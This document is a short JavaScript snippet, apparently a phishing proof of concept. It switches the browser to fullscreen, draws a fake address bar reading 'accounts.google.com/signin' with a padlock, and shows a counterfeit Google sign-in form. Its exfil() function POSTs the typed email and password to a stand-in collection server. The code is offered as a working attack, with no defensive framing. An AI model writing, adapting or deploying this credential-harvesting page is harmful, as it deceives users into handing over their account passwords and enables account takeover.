async function fullscreenPhish() {
  await document.documentElement.requestFullscreen();
  
  // Now render a fake browser chrome
  document.body.innerHTML = `
    <div style="background:#fff; width:100vw; height:100vh; font-family:sans-serif;">
      <!-- Fake browser address bar -->
      <div style="background:#f1f3f4; padding:10px; display:flex; align-items:center; gap:10px;">
        <div style="background:#fff; border:1px solid #ddd; border-radius:20px; padding:6px 16px; flex:1;">
          🔒 accounts.google.com/signin
        </div>
      </div>
      <!-- Fake login form -->
      <div style="display:flex; justify-content:center; margin-top:80px;">
        <div>
          <h2>Sign in with Google</h2>
          <input type="email" placeholder="Email" style="display:block; margin:10px 0; padding:8px; width:300px;"/><br/>
          <input type="password" placeholder="Password" style="display:block; margin:10px 0; padding:8px; width:300px;"/>
          <button onclick="exfil()">Next</button>
        </div>
      </div>
    </div>
  `;
}

function exfil() {
  const creds = {
    email: document.querySelector('input[type=email]').value,
    pass: document.querySelector('input[type=password]').value
  };
  fetch('https://your-server.com/collect', {
    method: 'POST',
    body: JSON.stringify(creds)
  });
}
